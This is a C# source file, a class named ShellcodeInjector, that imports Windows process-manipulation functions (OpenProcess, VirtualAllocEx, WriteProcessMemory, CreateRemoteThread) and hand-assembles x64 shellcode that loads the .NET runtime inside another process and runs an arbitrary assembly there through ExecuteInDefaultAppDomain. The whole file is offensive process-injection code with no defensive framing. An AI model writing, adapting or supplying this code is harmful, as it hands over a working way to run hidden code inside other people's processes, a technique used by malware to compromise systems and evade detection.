using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class ShellcodeInjector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static byte[] BuildShellcode(IntPtr pClrCreateInstance, IntPtr pExitThread) {
        List<byte> bytes = new List<byte>();

        // sub rsp, 0x48 (48 83 EC 48)
        bytes.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x48 });

        // mov rbx, rcx (48 89 CB)
        bytes.AddRange(new byte[] { 0x48, 0x89, 0xCB });

        // 1. CLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &pMetaHost)
        bytes.AddRange(new byte[] { 0x48, 0x8D, 0x4B, 0x00 });
        bytes.AddRange(new byte[] { 0x48, 0x8D, 0x53, 0x10 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x43, 0x50 });
        bytes.AddRange(new byte[] { 0x48, 0xB8 });
        bytes.AddRange(BitConverter.GetBytes(pClrCreateInstance.ToInt64()));
        bytes.AddRange(new byte[] { 0xFF, 0xD0 });
        bytes.AddRange(new byte[] { 0x85, 0xC0 });
        int jnz1_pos = bytes.Count;
        bytes.AddRange(new byte[] { 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00 });

        // 2. pMetaHost->GetRuntime(L"v4.0.30319", &IID_ICLRRuntimeInfo, &pRuntimeInfo)
        bytes.AddRange(new byte[] { 0x48, 0x8B, 0x4B, 0x50 });
        bytes.AddRange(new byte[] { 0x48, 0x8B, 0x01 });
        bytes.AddRange(new byte[] { 0x48, 0x8D, 0x53, 0x70 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x43, 0x20 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x4B, 0x58 });
        bytes.AddRange(new byte[] { 0xFF, 0x50, 0x18 });
        bytes.AddRange(new byte[] { 0x85, 0xC0 });
        int jnz2_pos = bytes.Count;
        bytes.AddRange(new byte[] { 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00 });

        // 3. pRuntimeInfo->GetInterface(&CLSID_CLRRuntimeHost, &IID_ICLRRuntimeHost, &pClrRuntimeHost)
        bytes.AddRange(new byte[] { 0x48, 0x8B, 0x4B, 0x58 });
        bytes.AddRange(new byte[] { 0x48, 0x8B, 0x01 });
        bytes.AddRange(new byte[] { 0x48, 0x8D, 0x53, 0x30 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x43, 0x40 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x4B, 0x60 });
        bytes.AddRange(new byte[] { 0xFF, 0x50, 0x48 });
        bytes.AddRange(new byte[] { 0x85, 0xC0 });
        int jnz3_pos = bytes.Count;
        bytes.AddRange(new byte[] { 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00 });

        // 4. pClrRuntimeHost->ExecuteInDefaultAppDomain(pwzAssemblyPath, pwzTypeName, pwzMethodName, pwzArgument, &dwReturn)
        bytes.AddRange(new byte[] { 0x48, 0x8B, 0x4B, 0x60 });
        bytes.AddRange(new byte[] { 0x48, 0x8B, 0x01 });
        bytes.AddRange(new byte[] { 0x48, 0x8D, 0x93, 0x90, 0x00, 0x00, 0x00 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x83, 0x90, 0x02, 0x00, 0x00 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x8B, 0x10, 0x03, 0x00, 0x00 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x93, 0x50, 0x03, 0x00, 0x00 });
        bytes.AddRange(new byte[] { 0x4C, 0x89, 0x54, 0x24, 0x20 });
        bytes.AddRange(new byte[] { 0x4C, 0x8D, 0x53, 0x68 });
        bytes.AddRange(new byte[] { 0x4C, 0x89, 0x54, 0x24, 0x28 });
        bytes.AddRange(new byte[] { 0xFF, 0x50, 0x58 });

        // exit_thread label
        int exitPos = bytes.Count;
        int rel1 = exitPos - (jnz1_pos + 6);
        int rel2 = exitPos - (jnz2_pos + 6);
        int rel3 = exitPos - (jnz3_pos + 6);
        byte[] bArr = bytes.ToArray();
        Array.Copy(BitConverter.GetBytes(rel1), 0, bArr, jnz1_pos + 2, 4);
        Array.Copy(BitConverter.GetBytes(rel2), 0, bArr, jnz2_pos + 2, 4);
        Array.Copy(BitConverter.GetBytes(rel3), 0, bArr, jnz3_pos + 2, 4);
        bytes = new List<byte>(bArr);

        // xor ecx, ecx (31 C9)
        bytes.AddRange(new byte[] { 0x31, 0xC9 });
        bytes.AddRange(new byte[] { 0x48, 0xB8 });
        bytes.AddRange(BitConverter.GetBytes(pExitThread.ToInt64()));
        bytes.AddRange(new byte[] { 0xFF, 0xD0 });

        return bytes.ToArray();
    }
}
